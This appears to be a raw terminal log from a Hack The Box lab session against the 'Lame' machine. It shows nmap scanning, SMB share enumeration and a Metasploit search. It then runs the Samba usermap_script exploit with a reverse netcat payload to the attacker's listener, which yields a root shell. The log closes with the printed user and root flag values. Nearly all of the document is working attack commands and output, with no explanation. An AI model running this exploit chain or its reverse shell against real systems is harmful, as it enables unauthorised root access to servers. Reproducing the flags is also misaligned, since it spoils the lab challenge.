@@ -1,1 +1,121 @@
+url: https://www.hackthebox.com/achievement/machine/2176456/1
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# nmap -sCV -T4 lane.htb                                                                                                                                             
+  Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 06:18 -05
+  Nmap scan report for lane.htb (10.10.10.3)
+  Host is up (0.11s latency).
+  Not shown: 996 filtered tcp ports (no-response)
+  PORT    STATE SERVICE     VERSION
+  21/tcp  open  ftp         vsftpd 2.3.4
+  | ftp-syst: 
+  |   STAT: 
+  | FTP server status:
+  |      Connected to 10.10.14.136
+  |      Logged in as ftp
+  |      TYPE: ASCII
+  |      No session bandwidth limit
+  |      Session timeout in seconds is 300
+  |      Control connection is plain text
+  |      Data connections will be plain text
+  |      vsFTPd 2.3.4 - secure, fast, stable
+  |_End of status
+  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+  | ssh-hostkey: 
+  |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+  |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+  445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+  
+  Host script results:
+  |_smb2-time: Protocol negotiation failed (SMB2)
+  |_clock-skew: mean: 7h00m34s, deviation: 2h49m45s, median: 5h00m32s
+  | smb-os-discovery: 
+  |   OS: Unix (Samba 3.0.20-Debian)
+  |   Computer name: lame
+  |   NetBIOS computer name: 
+  |   Domain name: hackthebox.gr
+  |   FQDN: lame.hackthebox.gr
+  |_  System time: 2025-05-04T12:19:07-04:00
+  | smb-security-mode: 
+  |   account_used: guest
+  |   authentication_level: user
+  |   challenge_response: supported
+  |_  message_signing: disabled (dangerous, but default)
+  
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds
+
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# smbmap -H lane.htb
+  
+      ________  ___      ___  _______   ___      ___       __         _______
+     /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+    (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+     \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+      __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+     /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+    (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+  -----------------------------------------------------------------------------
+  SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                       https://github.com/ShawnDEvans/smbmap
+  
+  [*] Detected 1 hosts serving SMB                                                                                                  
+  [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                               
+  [+] IP: 10.10.10.3:445  Name: lane.htb                  Status: Authenticated
+          Disk                                                    Permissions     Comment
+          ----                                                    -----------     -------
+          print$                                                  NO ACCESS       Printer Drivers
+          tmp                                                     READ, WRITE     oh noes!
+          opt                                                     NO ACCESS
+          IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+          ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+  [*] Closed 1 connections
+
+
+msf6 > search samba 3.0.20
+  
+  Matching Modules
+  ================
+  
+     #  Name                                Disclosure Date  Rank       Check  Description
+     -  ----                                ---------------  ----       -----  -----------
+     0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+  
+  
+  Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 > use 0
+  [*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > setg LHOST 10.10.14.136
+LHOST => 10.10.14.136
+msf6 exploit(multi/samba/usermap_script) > setg RHOST 10.10.10.3
+RHOST => 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) > setg RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) > exploit
+  [*] Started reverse TCP handler on 10.10.14.136:4444 
+  [*] Command shell session 1 opened (10.10.14.136:4444 -> 10.10.10.3:46673) at 2025-05-04 06:28:21 -0500
+
+id  
+  uid=0(root) gid=0(root)
+cd home
+cd makis
+  ls
+  sosite
+  user.txt
+cat user.txt    
+  1485b5a8126d17b851a52d5f949b3aab
+cd /root
+ls
+  Desktop
+  reset_logs.sh
+  root.txt
+  vnc.log
+cat root.txt
+  e7b1e98906dbd1fc3bf44519665d93d7
+
+
 
